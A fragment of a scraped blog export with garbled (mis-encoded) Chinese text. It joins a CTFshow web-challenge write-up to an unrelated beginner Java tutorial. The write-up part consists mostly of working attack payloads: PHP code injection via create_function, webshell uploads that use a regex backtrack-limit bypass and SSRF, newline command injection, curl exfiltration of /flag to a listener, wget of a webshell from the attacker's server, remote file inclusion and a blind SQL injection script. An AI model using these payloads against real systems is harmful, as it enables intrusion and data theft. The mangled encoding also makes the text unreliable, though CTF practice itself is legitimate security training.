if($_GET['ç§€'] > 60 * 60 * 24 * 30 * 3){ \n           die('ä½ å¤ªé•¿äº†'); \n       }else{ \n           sleep((int)$_GET['ç§€']); \n           echo $flag; \n       } \n   } \n```\n\nè‡ªåŠ¨è½¬æ¢æ—¶xexä¼šè¢«è½¬æ¢ä¸ºåŸå§‹æ•°å­—ï¼Œintå¼ºåˆ¶è½¬æ¢stringæ—¶å–åˆ°å­—æ¯åœæ­¢\n\n```\npayload:?ç§€=0.6e7\n```\n\n**684**\n\næºç åœ¨æ­¤\n\n```php\n<?php\n$action = $_GET['action'] ?? '';\n$arg = $_GET['arg'] ?? '';\n\nif(preg_match('/^[a-z0-9_]*$/isD', $action)) {\n    show_source(__FILE__);\n} else {\n    $action('', $arg);\n}\n```\n\nå˜é‡$actionè¦å‡ºç°æ•°å­—å­—æ¯ä»¥å¤–çš„å­—ç¬¦ï¼Œè¿˜è¦æ‰§è¡Œå‡½æ•°ï¼Œä½¿ç”¨\\create_functionï¼Œè¿™é‡Œåˆ©ç”¨çš„æ˜¯phpç¯å¢ƒä¸­é»˜è®¤çš„namespace\n\n> phpé‡Œé»˜è®¤å‘½åç©ºé—´æ˜¯\\ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚æ™®é€šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™\\function_name() è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚ å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚ æ¥ä¸‹æ¥ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥å¼•å‘å±é™©çš„å‡½æ•°ã€‚\n\n> create_function()æ˜¯PHPä¸­çš„å†…ç½®å‡½æ•°ï¼Œç”¨äºåœ¨PHPä¸­åˆ›å»ºåŒ¿å(lambda-style)å‡½æ•°ã€‚\n>\n> **ç”¨æ³•:**\n>\n> ```\n> string create_function ( $args, $code )\n> ```\n>\n> **å‚æ•°ï¼š**è¯¥å‡½æ•°æ¥å—ä»¥ä¸‹ä¸¤ä¸ªå‚æ•°ï¼š\n>\n> - **$args:**å®ƒæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„å‡½æ•°å‚æ•°ã€‚\n> - **$code:**å®ƒæ˜¯å­—ç¬¦ä¸²ç±»å‹çš„å‡½æ•°ä»£ç ã€‚\n>\n> **æ³¨æ„ï¼š**é€šå¸¸ï¼Œè¿™äº›å‚æ•°å°†ä½œä¸ºå•å¼•å·åˆ†éš”çš„å­—ç¬¦ä¸²ä¼ é€’ã€‚ä½¿ç”¨å•å¼•å·å¼•èµ·æ¥çš„å­—ç¬¦ä¸²çš„åŸå› æ˜¯ä¸ºäº†é˜²æ­¢å˜é‡åè¢«è§£æï¼Œå¦åˆ™ï¼Œå°†éœ€è¦åŒå¼•å·æ¥è½¬ä¹‰å˜é‡åï¼Œä¾‹å¦‚\\ $avarã€‚\n>\n> **è¿”å›å€¼ï¼š**æ­¤å‡½æ•°ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›å”¯ä¸€çš„å‡½æ•°åç§°ï¼Œå¦åˆ™ï¼Œåœ¨é”™è¯¯æ—¶è¿”å›FALSEã€‚\n\nè€Œå¯¹äºcreate_functionå‡½æ•°æ¥è¯´ï¼Œå®é™…æ‰§è¡Œçš„å†…å®¹å¦‚ä¸‹\n\n```\nfunction noname($args) { $code }\n```\n\nç»“å°¾æˆ‘ä»¬ä½¿ç”¨}é—­åˆï¼Œæœ€ç»ˆçš„payloadå¦‚ä¸‹\n\n```\npayload:?action=%5ccreate_function&arg=}system('tac /secret_you_never_know');/*\n```\n\n**685**\n\nåˆ©ç”¨æ­£åˆ™æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡\n\n> PHP ä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œç»™ pcre è®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ pcre.backtrack_limit\n> å›æº¯æ¬¡æ•°ä¸Šé™é»˜è®¤æ˜¯ 100 ä¸‡ã€‚å¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡äº† 100 ä¸‡ï¼Œpreg_match å°†ä¸å†è¿”å›é 1 å’Œ 0ï¼Œè€Œæ˜¯ falseã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼äº†ã€‚\n\n```python\nimport requests\nurl=\"http://b826efef-6cde-4fa8-84d3-4cb699605ab2.challenge.ctf.show\"\nfiles={\n\t'file':'<?php eval($_POST[1]);?>'+'b'*1000000\n}\nr=requests.post(url,files=files)\nprint(r.text)\n```\n\n**686**\n\næ— å‚RCE\n\n```\npayload:?code=system(current(getallheaders()));\nX-Forwarded-Host: cat /secret_you_never_know\n```\n\n**687**\n\næ¢è¡Œæ‰§è¡Œå‘½ä»¤\n\n```\npayload:?ip=1%0atac /flaaag\n```\n\n**688**\n\nä¿©å‡½æ•°ä¸€èµ·ç”¨æœ‰çš„é—®é¢˜\n\n`escapeshellarg();\nescapeshellcmd();`\n\n```\npayload:?url=http://ç›‘å¬ä½¿ç”¨çš„ip:port/' -F file=@/flag'\n```\n\nå®é™…ä¼ å…¥shellçš„æ˜¯\n\n```shell\ncurl 'http://IP:ç«¯å£/'\\\\'' -F file=@/flag'\\\\'''\n```\n\nç›´æ¥å¸¦å‡ºæ–‡ä»¶\n\n**689**\n\n```php\n<?php \nerror_reporting(0);\nif(isset($_GET) && !empty($_GET)){\n    $url = $_GET['file'];\n    $path = \"upload/\".$_GET['path'];\n    \n}else{\n    show_source(__FILE__);\n    exit();\n}\n\nif(strpos($path,'..') > -1){\n    die('This is a waf!');\n}\n\n\nif(strpos($url,'http://127.0.0.1/') === 0){\n    file_put_contents($path, file_get_contents($url));\n    echo \"console.log($path update successed!)\";\n}else{\n    echo \"Hello.CTFshow\";\n}\n```\n\nè¿™é‡Œåœ¨pathä½ç½®æ²¡æœ‰è¿‡æ»¤ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸ç®¡æˆ‘ä»¬åœ¨pathä½ç½®å†™å…¥ä»€ä¹ˆéƒ½ä¼šåŸå°ä¸åŠ¨çš„è¿”å›ï¼Œæ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬è®©dockerè®¿é—®è‡ªå·±ï¼Œåœ¨pathå¤„ä¼ å…¥æœ¨é©¬å³å¯\n\n```\nhttp://f784bf7a-ace9-414a-bbfd-cfd348cefd95.challenge.ctf.show/?file=http://127.0.0.1/?file=http://127.0.0.1/%26path=%3C?php%20eval($_POST[1]);?%3E&path=b.php\n```\n\n**690**\n\n```php\n<?php \nhighlight_file(__FILE__);\nerror_reporting(0);\n$args = $_GET['args'];\nfor ( $i=0; $i<count($args); $i++ ){\n    if ( !preg_match('/^\\w+$/', $args[$i]) )\n        exit(\"sorry\");\n}\n\nexec('./ ' . implode(\" \", $args));\n```\n\nä¼ å…¥çš„å‘½ä»¤ä¸­åªèƒ½æœ‰å­—æ¯å’Œæ•°å­—ï¼Œæ‰§è¡Œå‘½ä»¤å¯ç”¨æ¢è¡Œç»•è¿‡ï¼Œé—®é¢˜æ˜¯æˆ‘ä»¬è¦å¦‚ä½•æ„é€ å‘½ä»¤æ¥æ‰§è¡Œï¼Œé¦–å…ˆå› ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥ç›´æ¥æ‰§è¡Œæ˜¯è¡Œä¸é€šçš„ï¼Œé‚£å¯ä»¥å°è¯•å†™ä¸€ä¸ªæ–‡ä»¶ï¼Œæ„é€ ä¸€ä¸ªæœåŠ¡å™¨è¿”å›å†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬çš„è„šæœ¬\n\n```\n\n\n```\n\næ„é€ å¦‚ä¸‹å‘½ä»¤\n\n```\nmkdir a\ncd a\nwget 10è¿›åˆ¶æœåŠ¡å™¨IP\n```\n\næ­¤æ—¶aæ–‡ä»¶å¤¹ä¸‹å°±æœ‰ä¸€ä¸ªindex.htmlå†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æ²¡åŠæ³•æ‰§è¡Œï¼Œæ­¤æ—¶æˆ‘ä»¬åˆ©ç”¨taræ¥å°†æ–‡ä»¶ç±»å‹è¿›è¡Œæ›´æ”¹\n\n```\ntar cvf shell a\n```\n\nå°†aæ–‡ä»¶å¤¹æ‰“åŒ…æˆä¸€ä¸ªshellæ–‡ä»¶å°±å¯ä»¥æ‰§è¡Œäº†\n\n**691**\n\n```php\n<?php\ninclude('inc.php');\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction   filter($str){\n      $filterlist = \"/\\(|\\)|username|password|where|\n      case|when|like|regexp|into|limit|=|for|;/\";\n      if(preg_match($filterlist,strtolower($str))){\n        die(\"illegal input!\");\n      }\n      return $str;\n  }\n$username = isset($_POST['username'])?\nfilter($_POST['username']):die(\"please input username!\");\n$password = isset($_POST['password'])?\nfilter($_POST['password']):die(\"please input password!\");\n$sql = \"select * from admin where  username =\n '$username' and password = '$password' \";\n$res = $conn -> query($sql);\nif($res->num_rows>0){\n  $row = $res -> fetch_assoc();\n  if($row['id']){\n     echo $row['username'];\n  }\n}else{\n   echo \"The content in the password column is the flag!\";\n}\n?>\n```\n\norder byç›²æ³¨ï¼Œè´´ä¸ª[é“¾æ¥](https://blog.csdn.net/miuzzx/article/details/104908543)ï¼ŒåŸç†å°±æ˜¯é€šè¿‡passwordä½ç½®çš„å­—ç¬¦ä¸²çš„æ¯”è¾ƒå¯¼è‡´å›æ˜¾ä¸­usernameçš„å†…å®¹ä¸åŒæ¥åˆ¤æ–­ç»“æœï¼Œç›´æ¥å†™è„šæœ¬å§\n\n```python\nimport requests\nflagstr=\"-01234567890abcdefghiostw{}---\"\nurl=\"http://9446af78-f5bd-4d30-94b4-05dc5eb8f887.challenge.ctf.show/\"\nflag=\"\"\nfor i in range(0,100):\n    for j in range(1,len(flagstr)):\n        tmp=flag+flagstr[j]\n        data={'username':f\"'or 1 union select 1,2,'{tmp}' order by 3#\",\"password\":\"1\"}\n        tex=requests.post(url=url,data=data).text\n        if \"</code>admin\" in tex:\n            print(flag+flagstr[j-1])\n            flag=flag+flagstr[j-1]\n            break\n```\n\n**692**\n\nçœ‹ä¸€ä¸‹preg_replaceå‡½æ•°çš„ç”¨æ³•\n\n> # preg_replace\n>\n> (PHP 4, PHP 5, PHP 7, PHP 8)\n>\n> preg_replace â€” æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢\n>\n> ### è¯´æ˜\n>\n> ```\n> preg_replace(\n>   string|array $pattern,\n>   string|array $replacement,\n>   string|array $subject,\n>   int $limit = -1,\n>   int &$count = null\n> ): string|array|null\n> ```\n>\n> æœç´¢ `subject` ä¸­åŒ¹é… `pattern` çš„éƒ¨åˆ†ï¼Œä»¥ `replacement` è¿›è¡Œæ›¿æ¢ã€‚\n>\n> ```\n> replacement\n> ```\n>\n> ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚å¦‚æœè¿™ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶ä¸” `pattern` æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„æ¨¡å¼éƒ½ä½¿ç”¨è¿™ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ã€‚å¦‚æœ `pattern` å’Œ `replacement` éƒ½æ˜¯æ•°ç»„ï¼Œæ¯ä¸ª `pattern` ä½¿ç”¨ `replacement`ä¸­å¯¹åº”çš„å…ƒç´ è¿›è¡Œæ›¿æ¢ã€‚å¦‚æœ `replacement` ä¸­çš„å…ƒç´ æ¯” `pattern` ä¸­çš„å°‘ï¼Œå¤šå‡ºæ¥çš„ `pattern` ä½¿ç”¨ç©ºå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ã€‚\n>\n> `replacement` ä¸­å¯ä»¥åŒ…å«åå‘å¼•ç”¨ `\\\\n` æˆ– `$n`ï¼Œè¯­æ³•ä¸Šé¦–é€‰åè€…ã€‚ æ¯ä¸ªè¿™æ ·çš„å¼•ç”¨å°†è¢«åŒ¹é…åˆ°çš„ç¬¬ n ä¸ªæ•è·å­ç»„æ•è·åˆ°çš„æ–‡æœ¬æ›¿æ¢ã€‚ n å¯ä»¥æ˜¯0-99ï¼Œ`\\\\0` å’Œ `$0` ä»£è¡¨å®Œæ•´çš„æ¨¡å¼åŒ¹é…æ–‡æœ¬ã€‚æ•è·å­ç»„çš„åºå·è®¡æ•°æ–¹å¼ä¸ºï¼šä»£è¡¨æ•è·å­ç»„çš„å·¦æ‹¬å·ä»å·¦åˆ°å³ï¼Œ ä»1å¼€å§‹æ•°ã€‚å¦‚æœè¦åœ¨ `replacement` ä¸­ä½¿ç”¨åæ–œçº¿ï¼Œå¿…é¡»ä½¿ç”¨ 4 ä¸ª(`\"\\\\\\\\\"`ï¼Œè¯‘æ³¨ï¼šå› ä¸ºè¿™é¦–å…ˆæ˜¯ PHP çš„å­—ç¬¦ä¸²ï¼Œç»è¿‡è½¬ä¹‰åï¼Œæ˜¯ä¸¤ä¸ªï¼Œå†ç»è¿‡æ­£åˆ™è¡¨è¾¾å¼å¼•æ“åæ‰è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªåŸæ–‡åæ–œçº¿)ã€‚\n\næ­¤å¤„å¦‚æœå°†replacementä¸­å†…å®¹æ”¾å…¥`\\\\0`é‚£ä¹ˆå°±ä¼šç›´æ¥åŒ¹é…å‰é¢patternä¸­çš„ç»“æœ\n\n> preg_replaceä¸­çš„ç¬¬äºŒä¸ªå‚æ•°å¦‚æœæ˜¯%00ä¹Ÿå°±æ˜¯asciiä¸­çš„0,é‚£ä¹ˆå°†ä¼šåŒ¹é…åˆ°æ•´ä¸ªå­—ç¬¦ä¸²ã€‚\n> æ¯”å¦‚åˆå§‹çš„å­—ç¬¦ä¸²ä¸º\n> $option='123';\n> å¦‚æœæ‰§è¡Œ\n> preg_replace(\"$option='.*';\",\"\\x00\",$a)\n> é‚£ä¹ˆè¿”å›çš„ç»“æœæ˜¯\n> $option='$option='123';';\n> å…¶å®å°±æ˜¯æŠŠåŸæ¥çš„å­—ç¬¦ä¸²åˆæ”¾åˆ°å•å¼•å·é‡Œé¢äº†ã€‚\n> å‡è®¾æˆ‘ä»¬ç¬¬ä¸€æ¬¡ä¼ option=;phpinfo();//\n> é¦–å…ˆconfig.phpä¸­çš„å†…å®¹ä¼šè¢«æ›¿æ¢æˆ$option=';phpinfo();//'ã€‚\n> å¦‚æœæˆ‘ä»¬ç¬¬äºŒæ¬¡ä¼ option=%00\n> é‚£ä¹ˆæœ€ç»ˆçš„ç»“æœæ˜¯$option='$option=';phpinfo();//''\n> è¿™æ ·å°±é€ƒå‡ºäº†å•å¼•å·ï¼Œphpinfo()ä¹Ÿå°±æ‰§è¡ŒæˆåŠŸ\n> â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\n> ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œyu22xã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚\n> åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/miuzzx/article/details/122998220\n\n**693**\n\nextractå‡½æ•°åŠ è¿œç¨‹æ–‡ä»¶åŒ…å«\n\n```\n?function=extract&file=http://45.15.131.101/\n```\n\n**694**\n\næ„é€ X-Forwarded-Forè¯·æ±‚å¤´ä¸ºæ–‡ä»¶åï¼Œfileä¸º.å³å¯ç›´æ¥å†™å…¥åˆ°è¯·æ±‚å¤´æ‰€æ„é€ çš„æ–‡ä»¶åä¸­\n\n```\n/var/www/html/a.php/.\n```\n\n695\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"Javaå…¥é—¨","url":"/posts/63f03572.html","content":"\n# JAVA\n\n**Hello World!**\n\n```java\n//Main.java\npublic class Main {\n    public static void main(String[] args) {\n        System.out.println(\"Hello world!\");\n    }\n}\n//javac Main.java\n//java Main\n//JDK 11ä»¥åæ”¯æŒç›´æ¥ä½¿ç”¨javaæ‰§è¡Œæºä»£ç \n```\n\n**JDKï¼ˆJavaå¼€å‘å·¥å…·åŒ…ï¼‰ç»„æˆ**\n\n- JVMï¼šJavaè™šæ‹Ÿæœºï¼Œjavaç¨‹åºè¿è¡Œçš„åœ°æ–¹\n- æ ¸å¿ƒç±»åº“ï¼šJavaè‡ªå¸¦ç±»ï¼Œä¾›ç¨‹åºå‘˜è°ƒç”¨\n- JREï¼šJavaè¿è¡Œç¯å¢ƒ\n\n**æ•°æ®ç±»å‹**\n\nåŸºæœ¬æ•°æ®ç±»å‹\n\n- æ•´æ•°\n  - byte    1å­—èŠ‚\n  - short    2å­—èŠ‚\n  - intï¼ˆé»˜è®¤ï¼‰    4å­—èŠ‚\n  - long    8å­—èŠ‚ï¼ˆæ•´æ•°å®šä¹‰æ—¶éœ€è¦åœ¨æ•°å­—æœ«å°¾åŠ Lï¼‰\n- æµ®ç‚¹æ•°\n  - float    4å­—èŠ‚ï¼ˆå®šä¹‰æ—¶éœ€è¦åœ¨æ•°å­—æœ«å°¾åŠ Fï¼‰\n  - doubleï¼ˆé»˜è®¤ï¼‰    8å­—èŠ‚\n- å­—ç¬¦ï¼šchar 2å­—èŠ‚\n- å¸ƒå°”ï¼šboolen\n\nå¼•ç”¨æ•°æ®ç±»å‹\n\n\n\n\n\n\n\n\n\n\n\n**ç±»å‹è½¬æ¢**\n\né»˜è®¤ç±»å‹è½¬æ¢ï¼Œå°çš„è‡ªåŠ¨æ¢æˆå¤§çš„\n\n```java\nbyte a=1;\nbyte b=1;\nbyte c=a+b;//æ­¤å¤„ç¨‹åºæŠ¥é”™ï¼Œå› ä¸ºabåœ¨è¿›è¡ŒåŠ è¿ç®—å‰å·²ç»æ‰§è¡Œè¢«è½¬æ¢æˆintç±»å‹\nint c=a+b;//æ­¤å¤„æ­£ç¡®\n```\n\n**è¿ç®—ç¬¦**\n\nå’ŒC++ä¸€æ ·ï¼Œå­—ç¬¦ä¸²çš„ä¼˜å…ˆçº§æ‹‰æ»¡\n\n**JavaåŸç”ŸAPI**\n\n[å®˜æ–¹æ–‡æ¡£](https://www.oracle.com/java/technologies/javase-jdk17-doc-downloads.html)\n\n**Javaç”¨æˆ·è¾“å…¥ï¼ˆç»ƒä¹ ç³»ç»ŸAPIä½¿ç”¨ï¼‰**\n\n```java\nimport java.util.Scanner;//å¯¼å…¥ScanneråŒ…\npublic class scannerDemo {\n    public static void main(String[] args) {\n        Scanner s=new Scanner(System.in);//åˆ›å»ºä¸€ä¸ªScannerå¯¹è±¡\n        System.out.print(\"è¯·è¾“å…¥æ‚¨çš„å¹´é¾„ï¼š\");\n        int age=s.nextInt();//è·å–Scannerå¾—åˆ°çš„å†…å®¹\n        System.out.println(\"æ‚¨çš„å¹´é¾„æ˜¯ï¼š\"+age);\n    }\n}\n```\n\n**ç¨‹åºæµç¨‹æ§åˆ¶**\n\nifï¼Œswitchï¼Œforï¼Œwhileå’ŒC++å®Œå…¨ä¸€è‡´\n\n**RandomåŒ…**\n\n```java\nimport java.util.Random;\npublic class randomDemo {\n    public static void main(String[] args) {\n        Random r=new Random();\n        int shu=r.nextInt(10);//0-9èŒƒå›´\n    }\n}\n```\n\n**æ•°ç»„**\n\n```java\n//é™æ€åˆå§‹åŒ–æ•°ç»„\nint[] arr={20,10,234,22,15};\nString[] name={\"PSR\",\"ZYL\",\"HZJ\"}\n//åŠ¨æ€åˆå§‹åŒ–æ•°ç»„\nint [] arr=new int[10]\n```\n\nåŠ¨æ€åˆå§‹åŒ–æ•°ç»„é»˜è®¤å€¼ï¼š\n\næ•´å‹ï¼š0\n\næµ®ç‚¹å‹ï¼š0.0\n\nå¸ƒå°”ï¼šfalse\n\nå¼•ç”¨ç±»å‹ï¼šnull\n\n**æ–¹æ³•ï¼ˆå°±å‡½æ•°å•¦ï¼‰**\n\nå®Œæ•´å®šä¹‰æ ¼å¼ï¼š\n\n```\nä¿®é¥°ç¬¦ è¿”å›å€¼ç±»å‹ æ–¹æ³•å(å½¢å‚){\n    æ–¹æ³•ä½“ä»£ç \n    return è¿”å›å€¼;\n}\n```\n\n```java\npublic static int sum(int a,int b){\n    int c=a+b;\n    System.out.println(\"æ‚¨æ±‚çš„å’Œä¸ºï¼š\"+c);\n    return c;\n}\n```\n\nå…¶ä»–å®šä¹‰æ ¼å¼ï¼š\n\nå¯ä»¥æ²¡æœ‰è¿”å›å€¼ï¼ˆvoidï¼‰ï¼Œæ²¡æœ‰å‚æ•°\n\n**æ–¹æ³•æ•°æ®ä¼ é€’æœºåˆ¶**\n\nåŸºæœ¬ç±»å‹å‚æ•°ä¼ é€’ï¼šä¼ å€¼\n\nå¼•ç”¨ç±»å‹å‚æ•°ä¼ é€’ï¼šä¼ åœ°å€\n\n**æ–¹æ³•é‡è½½**\n\næ–¹æ³•åä¸€æ ·å‚æ•°ä¸ä¸€æ ·çš„æ–¹æ³•\n\n**ç±»**\n\n```java\npackage top.darkflow.OP;\npublic class Phone{\n    String brand;\n    double price;\n    public void start(){\n        System.out.println(\"æ¬¢è¿ä½¿ç”¨\"+brand+\"æ‰‹æœº\");\n    }\n}\n//æ„é€ å™¨å†™æ³•ä¸C++ç›¸åŒ\n//thiså…³é”®åœ¨ä»£è¡¨å½“å‰å¯¹è±¡çš„åœ°å€\n```\n\n**JavaBean**\n\nä¹Ÿè¢«ç§°ä½œå®ä½“ç±»ï¼Œå…¶å¯¹è±¡å¯ç”¨äºåœ¨ç¨‹åºä¸­å°è£…æ•°æ®\n\nè¦æ±‚ï¼š\n\n- æˆå‘˜å˜é‡ç”¨privateä¿®é¥°\n- æä¾›å¯¹åº”æˆå‘˜å˜é‡çš„getä¸setæ–¹æ³•\n- å¿…é¡»æœ‰ä¸€ä¸ªæ— å‚æ„é€ å™¨ï¼Œæœ‰å‚æ„é€ å¯æœ‰å¯æ— \n\n**Stringç±»**\n\nä¸å¯å˜ï¼šæŒ‡åŸå§‹å­—ç¬¦ä¸²ä¸å¯å˜ï¼Œç»è¿‡+è¿ç®—åäº§ç”Ÿæ–°çš„å­—ç¬¦ä¸²\n\nåˆ›å»ºæ–¹å¼\n\n```\nString s=new String(\"flag\");\nchar[] chars={'f','l','a','g'};\nString s=new String(chars);\nbyte[] bytes={102,108,97,103}\nString s=new String(bytes);\n```\n\n**Stringå¸¸ç”¨API**\n\n```\ns1.equals(s2)//æ¯”è¾ƒs1ï¼Œs2å­—ç¬¦ä¸²å†…å®¹æ˜¯å¦ç›¸åŒequalsIgnoreCaseå¿½ç•¥å¤§å°å†™\ns1.charAt(Index)//è·å–Indexä½ç½®çš„å­—ç¬¦\ns1.toCharArray()//å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºcharæ•°ç»„\ns1.substring(head,end)//æˆªå–å­—ç¬¦ä¸²\ns1.replace(target,replacement)//å°†å­—ç¬¦ä¸²ä¸­çš„targetç”¨replacementæ›¿æ¢\ns1.contains(s)//å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å«så­—ç¬¦ä¸²\ns1.startWiths(s)//å­—ç¬¦ä¸²æ˜¯å¦ä»¥så­—ç¬¦ä¸²å¼€å§‹\ns1.spilt(s)//ä»¥sä¸ºåˆ†å‰²ç¬¦æ¥å°†å­—ç¬¦ä¸²åˆ‡å‰²\n```\n\n**ArrayList**\n\n```\nArrayList list=new ArrayList()\nlist.add(ele)//å‘åˆ—è¡¨ä¸­æ·»åŠ å…ƒç´ ï¼ˆæ— ç±»å‹é™åˆ¶ï¼‰\nlist.add(index,ele)//å‘åˆ—è¡¨æŒ‡å®šä½ç½®æ’å…¥å…ƒç´ \n```\n\nArrayListæ”¯æŒæ³›å‹ï¼Œå¯é€šè¿‡`ArrayList<æ•°æ®ç±»å‹>`æ¥é™å®šåˆ—è¡¨ä¸­çš„æ•°æ®ç±»å‹\n\nä¸€äº›API\n\n```\nlist.get(index)//è·å–æŒ‡å®šä½ç½®å…ƒç´ \nlist.size()//è·å–åˆ—è¡¨å…ƒç´ ä¸ªæ•°\nlist.remove(index)//åˆ é™¤æŒ‡å®šä½ç½®çš„å…ƒç´ \nlist.set(index,ele)//ä¿®æ”¹æŒ‡å®šä½ç½®çš„å…ƒç´ \n```\n\n### é¢å‘å¯¹è±¡å’¯\n\n**staticå…³é”®å­—**\n\n- staticæ˜¯é™æ€çš„æ„æ€ï¼Œå¯ä»¥ç”¨æ¥ä¿®é¥°æˆå‘˜å˜é‡å’Œæˆå‘˜æ–¹æ³•\n- staticä¿®é¥°æˆå‘˜å˜é‡è¡¨ç¤ºè¯¥æˆå‘˜å˜é‡å€¼åœ¨å†…å­˜ä¸­å‚¨å­˜ä¸€ä»½ï¼Œå¯ä»¥è¢«å…±äº«è®¿é—®ä¿®æ”¹\n- é™æ€æˆå‘˜å˜é‡å¸¸ç”¨æ¥è¡¨ç¤ºéœ€è¦è¢«å…±äº«çš„ä¿¡æ¯ï¼Œå¯ä»¥è¢«å…±äº«è®¿é—®\n- é™æ€æˆå‘˜å˜é‡å’Œæ–¹æ³•è®¿é—®æ—¶å¯é€šè¿‡`ç±»å.æˆå‘˜`ä¹Ÿå¯é€šè¿‡`å¯¹è±¡å.æˆå‘˜`è®¿é—®ï¼Œå»ºè®®é€šè¿‡ç±»è®¿é—®\n- åœ¨åŒä¸€ä¸ªç±»ä¸­ï¼Œè®¿é—®é™æ€æ–¹æ³•ï¼Œç±»åå¯ä»¥çœç•¥ä¸å†™\n- æ³¨æ„è°ƒç”¨é™æ€æˆå‘˜æ–¹æ³•ï¼ˆåŒ…æ‹¬é€šè¿‡å¯¹è±¡è°ƒç”¨ï¼‰ï¼Œæ–¹æ³•ä¸­ä¸èƒ½è°ƒç”¨éé™æ€æˆå‘˜å˜é‡å“¦ï¼ˆå¦‚ä¸‹å›¾ï¼‰\n- ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202207050029328.png)\n- é™æ€æ–¹æ³•ä¸­ä¸å¯ä»¥å‡ºç°thiså…³é”®å­—\n\n**é™æ€æ–¹æ³•åº”ç”¨**\n\n- å¯ç”¨äºæ„é€ å·¥å…·ç±»ï¼Œç”±äºä¸éœ€è¦è¿›è¡Œå®ä¾‹åŒ–ï¼Œå¯å°†ç±»çš„æ„é€ å‡½æ•°è®¾ç½®æˆç§æœ‰æƒé™\n\n**ä»£ç å—**\n\nå®šä¹‰ï¼šèŠ±æ‹¬å·æ‹¬èµ·æ¥çš„éƒ½æ˜¯ä»£ç å—\n\n- staticä»£ç å—ï¼ˆstatic{}ï¼‰ï¼š\n  - å±äºç±»ï¼Œä¸ç±»ä¸€èµ·ä¼˜å…ˆåŠ è½½ï¼ˆæ¯”mainè¿˜å¿«ï¼‰ä¸€æ¬¡ï¼Œè‡ªåŠ¨è§¦å‘æ‰§è¡Œ\n  - ä½œç”¨ï¼šå¯ä»¥ç”¨äºåˆå§‹åŒ–é™æ€èµ„æºï¼Œä¸€è¾¹åç»­ä½¿ç”¨\n- å®ä¾‹ä»£ç å—ï¼ˆ{}ï¼‰ï¼š\n  - å±äºå¯¹è±¡ï¼Œæ¯æ¬¡æ„å»ºå¯¹è±¡æ—¶ï¼Œéƒ½ä¼šå‡ºå‘ä¸€æ¬¡æ‰§è¡Œ\n  - ä½œç”¨ï¼šåˆå§‹åŒ–å®ä¾‹èµ„æº\n\n**è®¾è®¡æ¨¡å¼**ï¼šåœ¨å¼€å‘ä¸­ç»å¸¸é‡åˆ°çš„é—®é¢˜çš„æœ€ä¼˜è§£\n\n**å•ä¾‹æ¨¡å¼**\n\nä¸€ä¸ªç±»åªèƒ½åˆ›å»ºä¸€ä¸ªå¯¹è±¡\n\n```java\n//é¥¿æ±‰å•ä¾‹ï¼Œåœ¨ç±»åŠ è½½æ—¶ç›´æ¥åˆ›é€ å¯¹è±¡\npublic class danli {\n    public static danli dddd=new danli();\n    private danli(){\n        System.out.println(\"å•ä¾‹è¢«åˆ›å»º\");\n    }\n}\n//æ‡’æ±‰å•ä¾‹ï¼Œåœ¨ç±»å®ä¾‹é¦–æ¬¡è¢«è°ƒç”¨æ—¶åˆ›é€ å¯¹è±¡\npublic class danli {\n    public static danli dddd;\n    private danli(){\n        System.out.println(\"å•ä¾‹è¢«åˆ›å»º\");\n    }\n    public static danli getInstance(){\n        if(dddd==null){\n            dddd=new danli();\n        }\n        return dddd;\n    